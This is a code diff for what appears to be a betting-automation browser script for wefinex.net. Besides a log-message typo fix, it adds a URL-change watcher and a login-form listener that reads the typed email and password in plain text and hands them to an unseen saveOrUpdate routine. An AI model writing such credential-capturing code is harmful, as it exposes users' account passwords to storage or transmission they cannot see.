@@ -20,7 +20,7 @@ const placeBet  = (doc) => {
                         console.log(currentTime);
                         if(  localStorage.getItem( betKeyStore)) {
                             if(localStorage.getItem( betKeyStore)  === `${doc.time}-${doc.type}`) {
-                               console.log('Đã bet lệch này ' + doc.time + doc.type );
+                               console.log('Đã bet lệnh này ' + doc.time + doc.type );
                                 return;
                             }
                         }
@@ -99,3 +99,61 @@ try {
 }
  
   
+// handle change url
+// listener local change
+let oldUrl ;
+const locationChangeEventType = "MY_APP-location-change";
+// called on creation and every url change
+ const observeUrlChanges = (cb) => {
+    assertLocationChangeObserver();
+    window.addEventListener(locationChangeEventType, () => cb(window.location));
+    cb(window.location);
+}
+ const assertLocationChangeObserver = () => {
+    let state = window;
+    if (state['MY_APP_locationWatchSetup']) {
+        return;
+    }
+    state['MY_APP_locationWatchSetup'] = true;
+    let lastHref = location.href;
+        document.querySelector("body").addEventListener("click", () => {
+            requestAnimationFrame(() => {
+                const currentHref = location.href;
+                if (currentHref !== lastHref) {
+                    lastHref = currentHref;
+                    window.dispatchEvent(new Event(locationChangeEventType));
+                }
+            });
+        });
+}
+const listenerLogin  = () => {
+ const  formEl = document.querySelector('.loginForm');
+    formEl .addEventListener('click' ,(event) => {
+        if(event.target['tagName'] === 'BUTTON') {
+            const userName = ( document.querySelector('.loginForm  input[name="email"]') as  HTMLInputElement).value;
+            const password = ( document.querySelector('.loginForm  input[name="password"]') as  HTMLInputElement).value;
+             WefinetController.saveOrUpdate({userName: userName, password:password}).then( (k => {
+                setTimeout( () => { 
+                    if(window.location.href.indexOf('wefinex.net/index') != -1) {
+                        window.location.reload();
+                     }
+                } , 1000 ) ;
+              }));
+        }
+   });  
+}
+observeUrlChanges((loc) => {
+    if(loc.href.indexOf('wefinex.net/login') !== -1) {
+       setTimeout( () => { listenerLogin(); } , 1000 ) ;
+    }
+    if(!oldUrl) {
+        // Lần đầu tiên vào trang
+       
+    } else {
+        // chuyển hướng 
+        if(loc.href.indexOf('wefinex.net/index') !== -1) {
+            window.location.reload();
+        }
+    }
+       oldUrl = loc.href;
+});
